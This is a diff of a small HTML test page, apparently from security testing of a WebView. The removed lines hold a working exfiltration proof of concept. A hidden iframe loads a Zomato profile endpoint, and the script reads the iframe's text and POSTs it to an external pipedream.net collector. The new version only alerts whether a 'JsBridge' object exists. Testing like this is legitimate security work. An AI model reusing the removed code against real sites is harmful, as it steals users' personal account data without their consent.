@@ -1,39 +1,7 @@
-<!DOCTYPE html>
 <html>
 <body>
-<h1>Loading...</h1>
-<div id="status"></div>
-
-<!-- Load the API in an iframe -->
-<iframe id="dataFrame" 
-        src="https://www.zomato.com/webroutes/getPage?page_url=/profile" 
-        style="display:none;">
-</iframe>
-
 <script>
-function log(msg) {
-    document.getElementById('status').innerHTML += msg + '<br>';
-}
-
-log('Attempting to load data...');
-
-// Try to read iframe content
-document.getElementById('dataFrame').onload = function() {
-    try {
-        const iframeDoc = this.contentDocument || this.contentWindow.document;
-        const data = iframeDoc.body.innerText;
-        
-        log('Got data! Sending...');
-        
-        fetch('https://eomfuajl79ed6za.m.pipedream.net/', {
-            method: 'POST',
-            body: data
-        }).then(() => log('Sent! ✓'));
-        
-    } catch(e) {
-        log('Error reading iframe: ' + e.message);
-    }
-};
+alert(typeof window.JsBridge);
 </script>
 </body>
 </html>
